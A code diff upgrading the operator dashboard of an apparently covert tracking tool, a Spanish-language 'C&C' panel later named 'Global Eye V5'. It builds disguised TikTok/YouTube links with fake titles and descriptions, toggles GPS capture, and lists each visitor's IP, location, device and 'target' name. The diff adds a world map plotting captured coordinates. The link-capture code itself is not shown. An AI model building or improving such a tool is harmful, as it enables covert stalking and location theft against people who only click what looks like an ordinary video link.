@@ -5,122 +5,140 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>C&C V4</title>
+    <title>C&C V5 Global Eye</title>
+    
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
     <style>
         :root {
             --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff;
-            --text-sec: #8b8b93; --danger: #ff4757; --glass: rgba(30, 30, 36, 0.8);
+            --text-sec: #8b8b93; --danger: #ff4757; 
         }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; padding-bottom: 80px; }
+        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
         
         /* HEADER */
-        .header { padding: 20px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; }
-        .header h1 { font-size: 24px; margin: 0; font-weight: 800; letter-spacing: -0.5px; background: linear-gradient(45deg, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .status-badge { background: rgba(0, 255, 136, 0.15); color: var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .header { padding: 40px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; background: var(--bg); z-index: 10; position: relative; }
+        .header h1 { font-size: 22px; margin: 0; font-weight: 800; letter-spacing: 1px; }
+        .status-badge { background: rgba(0, 255, 136, 0.1); color: var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; border: 1px solid rgba(0, 255, 136, 0.2); }
         .dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
 
+        /* CONTENIDO SCROLLABLE */
+        .content-area { height: calc(100vh - 140px); overflow-y: auto; padding: 20px; padding-bottom: 100px; }
+        
+        /* MAPA */
+        #map-container { height: 100%; width: 100%; border-radius: 20px; overflow: hidden; display: none; }
+        #map { height: 100%; width: 100%; }
+
         /* TABS NAVIGATION */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.9); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 10px 0; z-index: 100; }
-        .nav-item { color: var(--text-sec); text-align: center; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 33%; }
-        .nav-item.active { color: var(--accent); }
-        .nav-item span { font-size: 24px; }
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0 25px 0; z-index: 100; }
+        .nav-item { color: var(--text-sec); text-align: center; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 33%; transition: 0.2s; }
+        .nav-item.active { color: var(--accent); transform: scale(1.1); }
+        .nav-item span { font-size: 26px; }
 
         /* VISTAS */
-        .view { display: none; padding: 20px; animation: fadeIn 0.3s ease; }
+        .view { display: none; animation: fadeIn 0.3s ease; }
         .view.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
         /* CARDS & INPUTS */
-        .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a30; box-shadow: 0 10px 30px -10px rgba(0,0,0,0.5); }
-        .label { font-size: 11px; color: var(--text-sec); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 0.5px; }
-        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 15px; outline: none; transition: 0.2s; }
+        .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a30; }
+        .label { font-size: 10px; color: var(--text-sec); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 1px; }
+        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
         input:focus { border-color: var(--accent); }
         
-        .btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-primary { background: var(--accent); color: #000; box-shadow: 0 4px 15px rgba(0, 255, 136, 0.2); }
-        .btn-danger { background: rgba(255, 71, 87, 0.15); color: var(--danger); border: 1px solid rgba(255, 71, 87, 0.3); margin-top: 0; }
+        .btn-danger { background: rgba(255, 71, 87, 0.1); color: var(--danger); border: 1px solid rgba(255, 71, 87, 0.2); }
         
         /* LOGS */
         .log-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #2a2a30; }
-        .log-icon { width: 40px; height: 40px; background: #2a2a30; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-        .log-info { flex: 1; }
-        .log-title { font-weight: bold; font-size: 15px; margin-bottom: 2px; }
-        .log-meta { font-size: 12px; color: var(--text-sec); display: flex; gap: 8px; align-items: center; }
-        .log-map-btn { color: #fbce49; font-size: 12px; font-weight: bold; text-decoration: none; display: inline-flex; align-items: center; gap: 3px; margin-top: 4px; background: rgba(251, 206, 73, 0.1); padding: 3px 8px; border-radius: 6px; }
-
+        .log-icon { min-width: 40px; height: 40px; background: #2a2a30; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .log-info { flex: 1; overflow: hidden; }
+        .log-title { font-weight: bold; font-size: 14px; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .log-meta { font-size: 11px; color: var(--text-sec); display: flex; align-items: center; gap: 5px; }
+        
         /* SWITCH */
         .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
         .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 34px; }
         .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--accent); }
+        input:checked + .slider { background-color: var(--danger); } /* Rojo para GPS */
         input:checked + .slider:before { transform: translateX(20px); }
 
-        /* RESULTADO */
-        #result-area { display: none; animation: fadeIn 0.3s; }
-        .link-box { background: #2a2a30; padding: 15px; border-radius: 12px; font-family: monospace; font-size: 13px; color: var(--accent); word-break: break-all; text-align: center; margin-bottom: 10px; border: 1px dashed #444; }
+        /* CUSTOM ALERT STYLES */
+        .swal2-popup { background: #1e1e24 !important; color: white !important; border-radius: 20px !important; border: 1px solid #333; }
+        .swal2-title { color: white !important; font-size: 18px !important; }
+        .swal2-content { color: #aaa !important; }
+        .swal2-confirm { background: var(--accent) !important; color: black !important; border-radius: 10px !important; font-weight: bold !important; }
+        .swal2-cancel { background: #333 !important; color: white !important; border-radius: 10px !important; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>HoneyPot C&C</h1>
-        <div class="status-badge"><div class="dot"></div> ONLINE</div>
+        <h1>GLOBAL EYE <span style="color:var(--accent)">V5</span></h1>
+        <div class="status-badge"><div class="dot"></div> LIVE</div>
     </div>
 
-    <div id="view-home" class="view active">
-        <div class="card">
-            <label class="label">DESTINO (TIKTOK/YOUTUBE)</label>
-            <input type="text" id="urlDestino" placeholder="https://...">
-            <div style="height:15px"></div>
-            <label class="label">NOMBRE REFERENCIA</label>
-            <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
-            
-            <div style="height:20px"></div>
-            
-            <div class="row-switch">
-                <span style="font-size:13px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
-                <label class="switch">
-                    <input type="checkbox" id="checkGPS">
-                    <span class="slider round"></span>
-                </label>
-            </div>
+    <div class="content-area">
+        
+        <div id="view-home" class="view active">
+            <div class="card">
+                <label class="label">LINK REAL (TIKTOK/YOUTUBE)</label>
+                <input type="text" id="urlDestino" placeholder="Pega el enlace aquí...">
+                <div style="height:15px"></div>
+                <label class="label">NOMBRE REFERENCIA</label>
+                <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
+                
+                <div style="height:20px"></div>
+                
+                <div class="row-switch">
+                    <span style="font-size:13px; font-weight:600;">🛰️ RASTREO SATELITAL (GPS)</span>
+                    <label class="switch">
+                        <input type="checkbox" id="checkGPS">
+                        <span class="slider round"></span>
+                    </label>
+                </div>
 
-            <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:12px; color:var(--text-sec); margin-bottom:15px; cursor:pointer;">+ Opciones de Disfraz</div>
-            
-            <div id="adv-opts" style="display:none; margin-bottom:15px; border-top:1px solid #333; padding-top:15px;">
-                <label class="label">TÍTULO FALSO</label>
-                <input type="text" id="metaTitulo" placeholder="Título del video...">
-                <div style="height:10px"></div>
-                <label class="label">DESCRIPCIÓN</label>
-                <input type="text" id="metaDesc" placeholder="Likes, comentarios...">
-            </div>
+                <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:11px; color:var(--text-sec); margin-bottom:15px; cursor:pointer; text-decoration:underline;">⚙️ Personalizar Disfraz</div>
+                
+                <div id="adv-opts" style="display:none; margin-bottom:15px; border-top:1px solid #333; padding-top:15px;">
+                    <label class="label">TÍTULO FALSO</label>
+                    <input type="text" id="metaTitulo" placeholder="Título...">
+                    <div style="height:10px"></div>
+                    <label class="label">DESCRIPCIÓN</label>
+                    <input type="text" id="metaDesc" placeholder="Descripción...">
+                </div>
 
-            <button class="btn btn-primary" onclick="generarLink()">
-                <span class="material-icons-round">bolt</span> GENERAR ENLACE
+                <button class="btn btn-primary" onclick="generarLink()">
+                    <span class="material-icons-round">bolt</span> GENERAR ENLACE
+                </button>
+            </div>
+        </div>
+
+        <div id="view-logs" class="view">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                <h2 style="margin:0; font-size:18px;">Registro de Actividad</h2>
+                <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent);"><span class="material-icons-round">refresh</span></button>
+            </div>
+            <div id="logs-container"></div>
+            <div style="height:30px"></div>
+            <button class="btn btn-danger" onclick="borrarHistorial()">
+                <span class="material-icons-round">delete_forever</span> BORRAR DATOS
             </button>
         </div>
 
-        <div id="result-area">
-            <div class="link-box" id="final-link" onclick="copiar(this)">...</div>
-            <div style="text-align:center; font-size:12px; color:var(--text-sec);">Toca el link para copiar</div>
-        </div>
-    </div>
-
-    <div id="view-logs" class="view">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
-            <h2 style="margin:0; font-size:20px;">Actividad Reciente</h2>
-            <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent);"><span class="material-icons-round">refresh</span></button>
-        </div>
-        <div id="logs-container">
+        <div id="view-map" class="view" style="height: 100%;">
+            <div id="map-container" style="display:block; height: 100%;">
+                <div id="map"></div>
             </div>
-        <div style="height:50px"></div>
-        <button class="btn btn-danger" onclick="borrarHistorial()">
-            <span class="material-icons-round">delete</span> BORRAR HISTORIAL
-        </button>
+        </div>
+
     </div>
 
     <div class="nav-bar">
@@ -129,26 +147,79 @@
             Crear
         </div>
         <div class="nav-item" onclick="cambiarVista('logs', this)">
-            <span class="material-icons-round">radar</span>
-            Radar
+            <span class="material-icons-round">list_alt</span>
+            Lista
+        </div>
+        <div class="nav-item" onclick="cambiarVista('map', this)">
+            <span class="material-icons-round">public</span>
+            Mapa Global
         </div>
     </div>
 
     <script>
+        // --- MAPA GLOBAL ---
+        var map = null;
+        var markers = [];
+
+        function initMap() {
+            if(map) return; // Si ya existe, no lo creamos de nuevo
+            
+            // Mapa Oscuro (CartoDB DarkMatter)
+            map = L.map('map').setView([0, 0], 2);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; OpenStreetMap &copy; CARTO',
+                subdomains: 'abcd',
+                maxZoom: 20
+            }).addTo(map);
+        }
+
+        function updateMapPoints(logs) {
+            if(!map) return;
+            
+            // Limpiar marcadores viejos
+            markers.forEach(m => map.removeLayer(m));
+            markers = [];
+
+            logs.forEach(log => {
+                if(log.lat && log.lon) {
+                    // Crear pin rojo
+                    var circle = L.circleMarker([log.lat, log.lon], {
+                        color: '#ff4757',
+                        fillColor: '#ff4757',
+                        fillOpacity: 0.8,
+                        radius: 8
+                    }).addTo(map);
+                    
+                    circle.bindPopup(`<b>${log.ip}</b><br>${log.hora}<br>${log.dispositivo}`);
+                    markers.push(circle);
+                }
+            });
+        }
+
         // --- NAVEGACIÓN ---
         function cambiarVista(vista, elem) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            
             document.getElementById('view-' + vista).classList.add('active');
             elem.classList.add('active');
-            if(vista === 'logs') cargarLogs();
+            
+            if(vista === 'logs') {
+                cargarLogs();
+            } else if (vista === 'map') {
+                setTimeout(() => {
+                    initMap();
+                    map.invalidateSize(); // Arregla bug de visualización
+                    cargarLogs(true); // Cargar logs para poner los puntos
+                }, 100);
+            }
         }
 
         // --- LÓGICA ---
         async function generarLink() {
             let btn = document.querySelector('.btn-primary');
             let originalText = btn.innerHTML;
-            btn.innerHTML = "PROCESANDO...";
+            btn.innerHTML = "⏳...";
             
             let payload = {
                 nombre: document.getElementById('nombreTrampa').value || "Link",
@@ -158,7 +229,10 @@
                 meta_desc: document.getElementById('metaDesc').value
             };
 
-            if(!payload.url_destino) { alert("Falta el link"); btn.innerHTML = originalText; return; }
+            if(!payload.url_destino) { 
+                Swal.fire({icon: 'warning', title: 'Falta el Link', text: 'Pega un enlace de TikTok o YouTube.', background: '#1e1e24', color: '#fff'});
+                btn.innerHTML = originalText; return; 
+            }
             if(!payload.url_destino.startsWith('http')) payload.url_destino = 'https://' + payload.url_destino;
 
             try {
@@ -166,59 +240,92 @@
                     method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)
                 });
                 let data = await res.json();
-                document.getElementById('result-area').style.display = 'block';
-                document.getElementById('final-link').innerText = data.link;
+                
+                // ALERTA PRO
+                Swal.fire({
+                    title: '¡Enlace Listo!',
+                    text: data.link,
+                    icon: 'success',
+                    background: '#1e1e24', color: '#fff',
+                    confirmButtonText: 'COPIAR',
+                    confirmButtonColor: '#00ff88'
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        navigator.clipboard.writeText(data.link);
+                        Swal.fire({position: 'top-end', icon: 'success', title: 'Copiado', showConfirmButton: false, timer: 1500, background: '#1e1e24', color: '#fff'});
+                    }
+                });
+                
                 btn.innerHTML = originalText;
-            } catch(e) { alert("Error"); btn.innerHTML = originalText; }
+            } catch(e) { 
+                Swal.fire({icon: 'error', title: 'Error', text: 'No se pudo conectar al servidor'});
+                btn.innerHTML = originalText; 
+            }
         }
 
-        function copiar(e) { navigator.clipboard.writeText(e.innerText); alert("Copiado"); }
-
-        async function cargarLogs() {
-            let container = document.getElementById('logs-container');
-            container.innerHTML = "<div style='text-align:center; color:gray; margin-top:20px'>Cargando...</div>";
-            
+        async function cargarLogs(updateMap = false) {
             try {
                 let res = await fetch('/api/ver_ataques');
                 let data = await res.json();
+                
+                if(updateMap) {
+                    updateMapPoints(data);
+                    return;
+                }
+
+                let container = document.getElementById('logs-container');
                 let html = "";
                 
-                if(data.length === 0) html = "<div style='text-align:center; color:#444; margin-top:40px'>Sin actividad</div>";
+                if(data.length === 0) html = "<div style='text-align:center; color:#444; margin-top:40px'>Sin registros de inteligencia.</div>";
                 
                 data.forEach(log => {
-                    let iconName = "laptop";
-                    if(log.dispositivo.includes("iPhone")) iconName = "phone_iphone";
-                    else if(log.dispositivo.includes("Android")) iconName = "android";
+                    let icon = "laptop";
+                    if(log.dispositivo.includes("iPhone")) icon = "phone_iphone";
+                    else if(log.dispositivo.includes("Android")) icon = "android";
                     
-                    let gpsBtn = "";
+                    let statusColor = "var(--text-sec)";
+                    let gpsIcon = "";
+                    
                     if(log.lat && log.lon) {
-                        gpsBtn = `<a href="http://maps.google.com/?q=${log.lat},${log.lon}" target="_blank" class="log-map-btn"><span class="material-icons-round" style="font-size:14px">place</span> MAPA EXACTO</a>`;
+                        statusColor = "var(--danger)"; // Rojo si hay GPS
+                        gpsIcon = `<span style="color:var(--danger); font-size:12px; margin-left:5px;">● GPS</span>`;
                     }
 
                     html += `
                     <div class="log-item">
-                        <div class="log-icon"><span class="material-icons-round">${iconName}</span></div>
+                        <div class="log-icon"><span class="material-icons-round">${icon}</span></div>
                         <div class="log-info">
-                            <div class="log-title">${log.ubicacion}</div>
-                            <div class="log-meta">${log.ip} • ${log.hora}</div>
-                            <div class="log-meta" style="color:#555; margin-top:2px">🎯 ${log.trampa}</div>
-                            ${gpsBtn}
+                            <div class="log-title">${log.ubicacion} ${gpsIcon}</div>
+                            <div class="log-meta" style="color:${statusColor}">${log.ip}</div>
+                            <div class="log-meta">🕒 ${log.hora} • 🎯 ${log.trampa}</div>
                         </div>
                     </div>`;
                 });
                 container.innerHTML = html;
-            } catch(e) { container.innerHTML = "Error cargando"; }
+            } catch(e) { console.log(e); }
         }
 
         async function borrarHistorial() {
-            if(!confirm("¿Seguro que quieres BORRAR TODO el historial? No se puede deshacer.")) return;
-            
-            try {
-                await fetch('/api/borrar_logs', { method: 'POST' });
-                cargarLogs(); // Recargar lista vacía
-                alert("🗑️ Historial eliminado.");
-            } catch(e) { alert("Error al borrar"); }
+            Swal.fire({
+                title: '¿Estás seguro?',
+                text: "Se eliminarán todos los registros de inteligencia.",
+                icon: 'warning',
+                showCancelButton: true,
+                confirmButtonColor: '#ff4757',
+                cancelButtonColor: '#333',
+                confirmButtonText: 'Sí, borrar todo',
+                background: '#1e1e24', color: '#fff'
+            }).then(async (result) => {
+                if (result.isConfirmed) {
+                    await fetch('/api/borrar_logs', { method: 'POST' });
+                    cargarLogs();
+                    if(map) { markers.forEach(m => map.removeLayer(m)); markers=[]; }
+                    Swal.fire({title:'Borrado', icon:'success', background: '#1e1e24', color: '#fff'});
+                }
+            })
         }
+        
+        cargarLogs();
     </script>
 </body>
 </html>
